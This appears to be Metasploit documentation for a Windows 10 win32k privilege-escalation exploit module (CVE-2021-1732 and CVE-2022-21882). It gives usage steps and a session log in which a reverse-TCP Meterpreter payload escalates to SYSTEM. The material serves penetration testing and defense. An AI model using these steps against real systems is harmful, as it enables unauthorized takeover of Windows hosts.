## Vulnerable Application
A vulnerability exists within win32k that can be leveraged by an attacker to escalate privileges to those of
NT AUTHORITY\SYSTEM. The flaw exists in how the WndExtra field of a window can be manipulated into being
treated as an offset despite being populated by an attacker-controlled value. This can be leveraged to
achieve an out of bounds write operation, eventually leading to privilege escalation.

This flaw was originally identified as CVE-2021-1732 and was patched by Microsoft on February 9th, 2021.
In early 2022, a technique to bypass the patch was identified and assigned CVE-2022-21882. The root cause is
is the same for both vulnerabilities. This exploit combines the patch bypass with the original exploit to
function on a wider range of Windows 10 targets.

Windows 10 builds 17134 (v1803) through 19041 (v20H1) will use the original technique from CVE-2021-1732, leveraging
`user32!CreateWindowEx` to trigger the `xxxClientAllocWindowClassExtraBytes` hook and corrupt the target window. Windows
10 builds 19042 (v20H2) through 19044 (v21H2) will use the updated technique from CVE-2022-21882, leveraging
`win32u!NtUserMessageCall` to trigger the `xxxClientAllocWindowClassExtraBytes` hook for the same effect.

### Installation And Setup
Windows 10 versions 1803 through 21H2 (without the patch) are vulnerable out of the box. This exploit module has been
tested on Windows 10 versions 1803, 1909, 20H1, 20H2 and 21H2.

## Verification Steps

1. Start msfconsole
1. Get a Meterpreter session on a vulnerable host
1. Do: `use exploit/windows/local/cve_2022_21882_win32k`
1. Set the `SESSION` and `PAYLOAD` options
1. Do: `run`
1. You should get a shell.

## Scenarios

### Windows 10 Version 21H2 Build 19044.1288 x64

```
msf6 exploit(windows/local/cve_2022_21882_win32k) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-SRAQBLH\smcintyre
meterpreter > sysinfo
Computer        : DESKTOP-SRAQBLH
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getsystem
[-] stdapi_sys_config_getuid: Operation failed: 1346 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(windows/local/cve_2022_21882_win32k) > set SESSION -1
SESSION => -1
msf6 exploit(windows/local/cve_2022_21882_win32k) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_21882_win32k) > set LHOST 192.168.159.128 
LHOST => 192.168.159.128
msf6 exploit(windows/local/cve_2022_21882_win32k) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching netsh to host the DLL...
[+] Process 6840 launched.
[*] Reflectively injecting the DLL into 6840...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200262 bytes) to 192.168.159.87
[*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.87:52622 ) at 2022-02-18 14:34:00 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-SRAQBLH
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 
```
